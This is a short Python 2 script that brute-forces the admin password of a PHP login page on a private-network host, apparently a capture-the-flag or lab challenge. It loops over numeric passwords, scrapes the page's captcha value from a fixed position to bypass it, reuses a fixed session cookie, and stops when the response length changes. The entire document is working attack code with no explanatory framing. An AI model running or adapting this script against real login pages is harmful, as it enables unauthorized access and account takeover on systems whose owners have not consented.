#!/usr/bin/env python
#encoding = utf-8
import requests
url = "http://172.16.1.129/web/web38/9s81jWjd98YU.php"
for i in range(11111,12111):
    res = requests.get(url, headers={"cookie":"PHPSESSID=r26esb373o7pn0qhmn71e0rt47"})
    #print res
    rancode = res.content[514:517]  #验证码的位置
    #print rancode
    
    
    #print rancode   #登录页面的代码值
    res = requests.get(url+"?username=admin&password="+str(i)+"&randcode="+rancode, headers={"cookie":"PHPSESSID=r26esb373o7pn0qhmn71e0rt47"})
    print res.content
    print len(res.content)
    if len(res.content) != 163:
        print i
        break
